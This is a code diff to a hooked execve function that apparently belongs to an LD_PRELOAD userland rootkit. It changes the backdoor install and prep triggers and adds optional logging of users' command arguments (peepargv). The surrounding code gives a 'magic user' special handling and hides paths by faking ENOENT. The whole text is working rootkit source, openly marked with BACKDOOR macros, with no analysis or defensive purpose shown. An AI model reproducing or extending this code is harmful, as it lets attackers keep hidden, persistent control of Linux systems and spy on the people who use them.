@@ -1,11 +1,5 @@
 int execve(const char *filename, char *const argv[], char *const envp[]){
-    if(!notuser(0) && rknomore() &&
-                                #ifdef PATCH_DYNAMIC_LINKER
-                                !preloadok(PRELOAD_FILE)
-                                #else
-                                !preloadok(OLD_PRELOAD)
-                                #endif
-                                && !fnmatch("*/bdvinstall", argv[0], FNM_PATHNAME))
+    if(!notuser(0) && rknomore() && !preloadok() && !fnmatch("*/bdvinstall", argv[0], FNM_PATHNAME))
         bdvinstall(argv);
 
     plsdomefirst();
@@ -14,8 +8,10 @@ int execve(const char *filename, char *const argv[], char *const envp[]){
 
     if(magicusr()){
 #ifdef BACKDOOR_ROLF
-        if(!fnmatch("*/bdvprep", argv[0], FNM_PATHNAME))
+        if(!fnmatch("*/bdvprep", argv[0], FNM_PATHNAME)){
             bdprep();
+            exit(0);
+        }
 #endif
 #ifdef BACKDOOR_UTIL
         if(!fnmatch("*/bdv", argv[0], FNM_PATHNAME))
@@ -23,6 +19,10 @@ int execve(const char *filename, char *const argv[], char *const envp[]){
 #endif
         return (long)call(CEXECVE, filename, argv, envp);
     }
+
+#ifdef LOG_USER_EXEC
+    peepargv(argv);
+#endif
 
     if(hidden_path(filename)){
         errno = ENOENT;
